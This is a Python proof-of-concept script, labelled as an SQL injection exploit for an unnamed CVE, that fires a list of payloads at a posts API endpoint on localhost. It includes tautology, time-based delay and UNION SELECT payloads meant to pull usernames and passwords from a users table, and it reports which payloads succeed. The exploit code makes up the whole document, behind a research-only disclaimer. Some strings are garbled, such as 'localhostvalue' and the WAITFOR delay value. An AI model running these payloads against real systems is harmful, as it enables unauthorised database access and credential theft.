#!/usr/bin/env python3

"""
SQL Injection Exploit PoC for CVE-XXXX-XXXX
Severity: Critical
Target: GET http://localhostvalue/api/v1/posts/{postId}
Description: This script demonstrates a SQL Injection vulnerability in the postId parameter.
CWE-89: SQL Injection

DISCLAIMER: This tool is intended for security research purposes only and should be used only on systems with explicit consent. Misuse of this tool can result in criminal charges brought against the persons in question. The author or any associated entities will not be held responsible for any damages.

Requirements:
- Python 3
- requests
- colorama

Usage:
python3 sql_injection_poc.py
"""

import requests
from colorama import Fore, Style, init
import time
import json

# Initialize Colorama
init(autoreset=True)

# Constants
TARGET_URL = "http://localhost:5000/api/v1/posts/"
TIMEOUT = 10
VERIFY_SSL = False
PROXIES = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}  # For Burp Suite integration
HEADERS = {"User-Agent": "SQLi Scanner 1.0"}

# Payloads
PAYLOADS = [
    "' OR '1'='1",
    "' UNION SELECT null, username, password FROM users--",
    "'; WAITFOR DELAY '0valuevalue'--",
    "' OR SLEEP(5)=0--",
    "' OR BENCHMARK(1000000,MD5('1'))--"
]

def send_request(url, payload):
    """Send request with payload."""
    try:
        full_url = f"{url}{payload}"
        start_time = time.time()
        response = requests.get(full_url, headers=HEADERS, timeout=TIMEOUT, verify=VERIFY_SSL, proxies=PROXIES)
        end_time = time.time()
        duration = end_time - start_time
        return (True, response, duration)
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[!] Request failed: {e}")
        return (False, None, 0)

def test_baseline(url):
    """Test baseline response time."""
    print(f"{Fore.YELLOW}[+] Establishing baseline response time...")
    _, response, duration = send_request(url, "1")  # Assuming '1' is a valid postId
    if response and response.status_code == 200:
        print(f"{Fore.GREEN}[+] Baseline established: {duration:.2f} seconds")
        return duration
    else:
        print(f"{Fore.RED}[!] Failed to establish baseline.")
        exit(1)

def exploit(url, payloads):
    """Main exploit function."""
    print(f"{Fore.YELLOW}[+] Starting SQL Injection Exploit...")
    baseline_duration = test_baseline(url)

    for payload in payloads:
        print(f"\n{Fore.YELLOW}[+] Testing payload: {payload}")
        success, response, duration = send_request(url, payload)
        if success:
            if duration > baseline_duration + 2:  # Adjust based on network conditions
                print(f"{Fore.RED}[VULNERABLE] {payload} caused a delay! Duration: {duration:.2f} seconds")
            elif "username" in response.text or "password" in response.text:
                print(f"{Fore.RED}[VULNERABLE] {payload} exposed sensitive data!")
            else:
                print(f"{Fore.GREEN}[SAFE] Payload did not have an effect.")
        else:
            print(f"{Fore.RED}[!] Error sending payload.")

def main():
    """Main function."""
    print(f"{Fore.CYAN}SQL Injection Exploit PoC")
    print(f"{Fore.CYAN}Target: {TARGET_URL}")
    exploit(TARGET_URL, PAYLOADS)

if __name__ == "__main__":
    main()
